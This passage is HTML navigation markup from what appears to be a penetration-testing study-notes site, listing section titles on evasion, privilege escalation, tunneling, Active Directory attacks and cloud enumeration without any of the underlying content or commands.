        On-Disk Evasion
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#in-memory-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      
        In-Memory Evasion
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#av-evasion-in-practice" class="md-nav__link">
    <span class="md-ellipsis">
      
        AV Evasion in Practice
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="AV Evasion in Practice">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#testing-for-av-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Testing for AV Evasion
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ad-evasion-custom-binaries" class="md-nav__link">
    <span class="md-ellipsis">
      
        AD Evasion - Custom Binaries
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ad-evasion-memory-injection" class="md-nav__link">
    <span class="md-ellipsis">
      
        AD Evasion - Memory Injection
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#automating-the-process" class="md-nav__link">
    <span class="md-ellipsis">
      
        Automating the Process
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Windows Privilege Escalation
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-windows" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Windows
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumerating Windows">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#understanding-windows-privileges-and-access-control-mechanisms" class="md-nav__link">
    <span class="md-ellipsis">
      
        Understanding Windows Privileges and Access Control Mechanisms
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#situational-awareness" class="md-nav__link">
    <span class="md-ellipsis">
      
        Situational Awareness
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hidden-in-plain-view" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hidden in Plain View
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#information-goldmine-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Information Goldmine PowerShell
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#automated-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Automated Enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leveraging-windows-services" class="md-nav__link">
    <span class="md-ellipsis">
      
        Leveraging Windows Services
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Leveraging Windows Services">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#service-binary-hijacking" class="md-nav__link">
    <span class="md-ellipsis">
      
        Service Binary Hijacking
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dll-hijacking" class="md-nav__link">
    <span class="md-ellipsis">
      
        DLL Hijacking
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unquoted-service-paths" class="md-nav__link">
    <span class="md-ellipsis">
      
        Unquoted Service Paths
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abusing-other-windows-components" class="md-nav__link">
    <span class="md-ellipsis">
      
        Abusing Other Windows Components
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abusing Other Windows Components">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#scheduled-tasks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Scheduled Tasks
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using Exploits
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Linux Privilege Escalation
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Linux Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-linux" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Linux
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exposed-confidential-information" class="md-nav__link">
    <span class="md-ellipsis">
      
        Exposed Confidential Information
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#insecure-file-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      
        Insecure File Permissions
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#insecure-system-components" class="md-nav__link">
    <span class="md-ellipsis">
      
        Insecure System Components
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-redirection-and-ssh-tunneling" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Redirection and SSH Tunneling
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port Redirection and SSH Tunneling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-forwarding-with-linux-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Forwarding with Linux Tools
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port Forwarding with Linux Tools">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-forwarding-with-socat" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Forwarding with Socat
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-tunneling" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Tunneling
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SSH Tunneling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ssh-local-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Local Port Forwarding
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-dynamic-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Dynamic Port Forwarding
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-remote-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Remote Port Forwarding
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-remote-dynamic-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Remote Dynamic Port Forwarding
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-sshuttle" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using sshuttle
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-forwarding-with-windows-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Forwarding with Windows Tools
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port Forwarding with Windows Tools">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sshexe" class="md-nav__link">
    <span class="md-ellipsis">
      
        ssh.exe
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#plink" class="md-nav__link">
    <span class="md-ellipsis">
      
        Plink
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netsh" class="md-nav__link">
    <span class="md-ellipsis">
      
        Netsh
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tunneling-through-deep-packet-inspection" class="md-nav__link">
    <span class="md-ellipsis">
      
        Tunneling Through Deep Packet Inspection
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Tunneling Through Deep Packet Inspection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#http-tunneling-with-chisel" class="md-nav__link">
    <span class="md-ellipsis">
      
        HTTP Tunneling with Chisel
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-tunneling-with-lilogo-ng" class="md-nav__link">
    <span class="md-ellipsis">
      
        HTTP Tunneling with Lilogo-NG
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-tunneling-fundamentals" class="md-nav__link">
    <span class="md-ellipsis">
      
        DNS Tunneling Fundamentals
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-tunneling-with-dnscat2" class="md-nav__link">
    <span class="md-ellipsis">
      
        DNS Tunneling with dnscat2
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#the-metasploit-framework" class="md-nav__link">
    <span class="md-ellipsis">
      
        The Metasploit Framework
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="The Metasploit Framework">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#getting-familiar-with-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Getting Familiar with Metasploit
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-metasploit-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using Metasploit Payloads
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#performing-post-exploitation-with-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Performing Post-Exploitation with Metasploit
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#automating-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Automating Metasploit
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory-introduction-and-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory Introduction and Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Introduction and Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#active-directory-manual-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory - Manual Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory - Manual Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#active-directory-enumeration-using-legacy-windows-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory - Enumeration Using Legacy Windows Tools
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-active-directory-using-powershell-and-net-classes" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Active Directory using PowerShell and .NET Classes
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#adding-search-functionality-to-our-script" class="md-nav__link">
    <span class="md-ellipsis">
      
        Adding Search Functionality to our Script
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ad-enumeration-with-powerview" class="md-nav__link">
    <span class="md-ellipsis">
      
        AD Enumeration with PowerView
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manual-enumeration-expanding-our-repertoire" class="md-nav__link">
    <span class="md-ellipsis">
      
        Manual Enumeration - Expanding our Repertoire
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Manual Enumeration - Expanding our Repertoire">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-operating-systems" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Operating Systems
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-an-overview-permissions-and-logged-on-users" class="md-nav__link">
    <span class="md-ellipsis">
      
        Getting an Overview - Permissions and Logged on Users
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration-through-service-principal-names" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumeration Through Service Principal Names
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-object-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Object Permissions
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-domain-shares" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Domain Shares
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-automated-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory - Automated Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory - Automated Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#collecting-data-with-sharphound" class="md-nav__link">
    <span class="md-ellipsis">
      
        Collecting Data with SharpHound
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#analysing-data-using-bloodhound" class="md-nav__link">
    <span class="md-ellipsis">
      
        Analysing Data using BloodHound
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacking-active-directory-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      
        Attacking Active Directory Authentication
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Active Directory Authentication">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ntlm-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      
        NTLM Authentication
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberos-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      
        Kerberos Authentication
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cached-ad-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      
        Cached AD Credentials
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#performing-attacks-on-active-directory-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      
        Performing Attacks on Active Directory Authentication
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Performing Attacks on Active Directory Authentication">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#password-attacks_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Password Attacks
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#as-rep-roasting" class="md-nav__link">
    <span class="md-ellipsis">
      
        AS-REP Roasting
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      
        Kerberoasting
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#silver-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      
        Silver Ticket
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-controller-synchronization-dcsync" class="md-nav__link">
    <span class="md-ellipsis">
      
        Domain Controller Synchronization - DCsync
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nopac-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        NoPac Exploit
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#zerologon-exploit-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        ZeroLogon Exploit Exploit
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dfscoerce-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        DFSCoerce Exploit
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lateral-movement-in-active-directory" class="md-nav__link">
    <span class="md-ellipsis">
      
        Lateral Movement in Active Directory
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lateral Movement in Active Directory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#active-directory-lateral-movement-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory Lateral Movement Techniques
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Lateral Movement Techniques">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wmi-and-winrm" class="md-nav__link">
    <span class="md-ellipsis">
      
        WMI and WinRM
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    <span class="md-ellipsis">
      
        PsExec
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      
        Pass the Hash
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overpass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      
        Overpass the Hash
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      
        Pass the Ticket
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcom" class="md-nav__link">
    <span class="md-ellipsis">
      
        DCOM
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-persistence" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory Persistence
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Persistence">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#golden-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      
        Golden Ticket
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shadow-copies" class="md-nav__link">
    <span class="md-ellipsis">
      
        Shadow Copies
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumerating-aws-cloud-infrastructure" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating AWS Cloud Infrastructure
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumerating AWS Cloud Infrastructure">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance-of-cloud-resources-on-the-internet" class="md-nav__link">
    <span class="md-ellipsis">
      
        Reconnaissance of Cloud Resources on the Internet
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance of Cloud Resources on the Internet">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-and-subdomain-reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      
        Domain and Subdomain Reconnaissance
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-specific-domains" class="md-nav__link">
    <span class="md-ellipsis">
      
        Service-specific Domains
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reconnaissance-via-cloud-service-providers-api" class="md-nav__link">
    <span class="md-ellipsis">
      
        Reconnaissance via Cloud Service Provider's API
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance via Cloud Service Provider&#39;s API">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#configure-aws-cli" class="md-nav__link">
    <span class="md-ellipsis">
      
        Configure AWS CLI
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#publicly-shared-resources" class="md-nav__link">
    <span class="md-ellipsis">
      
        Publicly Shared Resources
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#obtaining-account-ids-from-s3-buckets" class="md-nav__link">
    <span class="md-ellipsis">
      
        Obtaining Account IDs from S3 Buckets
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-iam-users-in-other-accounts" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating IAM Users in Other Accounts
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#initial-iam-reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      
        Initial IAM Reconnaissance
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Initial IAM Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#examining-compromised-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      
        Examining Compromised Credentials
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#scoping-iam-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      
        Scoping IAM permissions
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iam-resources-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        IAM Resources Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="IAM Resources Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-iam-resources" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating IAM Resources
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#processing-api-response-data-with-jmespath" class="md-nav__link">
    <span class="md-ellipsis">
      
        Processing API Response data with JMESPath
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#running-automated-enumeration-with-pacu" class="md-nav__link">
    <span class="md-ellipsis">
      
        Running Automated Enumeration with Pacu
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extracting-insights-from-enumeration-data" class="md-nav__link">
    <span class="md-ellipsis">
      
        Extracting Insights from Enumeration Data
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    eCPPT Materials
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    eCPPT Materials
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../eCPPT%20Materials/Linux%20Exploitation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Linux Exploitation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../eCPPT%20Materials/Network%20Security/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Network Security
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../eCPPT%20Materials/Powershell%20For%20Pentesting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Powershell For Pentesting
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../eCPPT%20Materials/Ruby%20%26%20Metasploit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Ruby & Metasploit
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../eCPPT%20Materials/System%20Security/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    System Security
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../eCPPT%20Materials/WIFI%20Security/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    WIFI Security
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../eCPPT%20Materials/Web%20App%20Security/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Web App Security
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    eMAPT
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    eMAPT
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../eMAPT/Mobile%20Application%20Security%20Testing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Mobile Application Security Testing
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        Information gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Information gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#passive-information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        Passive Information Gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Passive Information Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#passive-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Passive Enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#llm-powered-passive-information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        LLM-Powered Passive Information Gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LLM-Powered Passive Information Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#passive-llm-aided-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Passive LLM-Aided enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Information Gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Information Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-scanning-with-nmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Scanning with Nmap
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        SMB Enumeration
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smtp-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        SMTP Enumeration
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snmp-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        SNMP Enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#llm-powered-active-information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        LLM-Powered Active Information Gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LLM-Powered Active Information Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#active-llm-aided-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active LLM-Aided enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerability-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      
        Vulnerability Scanning
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Scanning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerability-scanning-with-nessus" class="md-nav__link">
    <span class="md-ellipsis">
      
        Vulnerability Scanning with Nessus
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Scanning with Nessus">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#installing-nessus" class="md-nav__link">
    <span class="md-ellipsis">
      
        Installing Nessus
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-scanning-with-nmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Vulnerability Scanning with Nmap
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Scanning with Nmap">
